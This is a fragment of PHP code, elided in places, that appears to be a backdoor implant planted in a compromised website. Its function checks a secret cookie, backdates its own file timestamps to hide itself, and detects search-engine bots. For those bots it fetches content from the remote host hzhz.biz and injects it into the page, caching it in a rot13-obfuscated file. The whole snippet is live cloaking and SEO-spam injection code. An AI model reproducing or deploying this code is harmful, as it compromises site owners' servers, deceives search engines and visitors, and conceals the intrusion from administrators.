...
if (!function_exists('jkkljd'))
{
	define('PATH777',dirname(__FILE__).'/');
	...
	function jkkljd()
	{
		...
		$key     = 'Fw0REuHITUIPyMpaUCANOqFgHmCXSQ';

		if (isset($_COOKIE['kk34']))
		{
			@touch(__FILE__,time()-60*60*24*300);
			echo 'lt_pass';
			exit() ;
		}
		...
		if (filesize(PATH777 . 'base') == 2) {return ;}
		...
		if(strpos( $xxxx1, '-NO-WAY-' )) {$is_bot = TRUE;}

		if (!$is_bot) {return ;	}
		
		$api_url = 'http://hzhz.biz/sis/q.php';
		$x_id    = '892';
		$md5_url = md5($_SERVER['REQUEST_URI']);

		//load_base

		if (is_file(PATH777 . 'base'))
		{
			$base = @unserialize(str_rot13(@file_get_contents(PATH777 . 'base')));
		}
		...
		if (isset($base[$md5_url]))
		{
			echo $base[$md5_url];
			return ;
		}

		$isboturl = $api_url . '?id=' . $x_id . '&domain=' . str_replace('www.','',$_SERVER['HTTP_HOST']);
		...
		if(@function_exists("curl_init"))
		{
			...
			$anws = @curl_exec($actualUpdate);
			@curl_close($actualUpdate);
		}
		elseif(@ini_get("allow_url_fopen") == 1)
		{
			$anws = @file_get_contents($isboturl);
		}

		if ($anws === 'DISABLE' || $anws == '') {file_put_contents(PATH777 . 'base','zz');return ;}
		$base[$md5_url] = $anws;
		echo $anws;
		file_put_contents(PATH777 . 'base',str_rot13(serialize($base)),LOCK_EX);
		@touch(PATH777 . 'base',time()-60*60*24*300);
	}
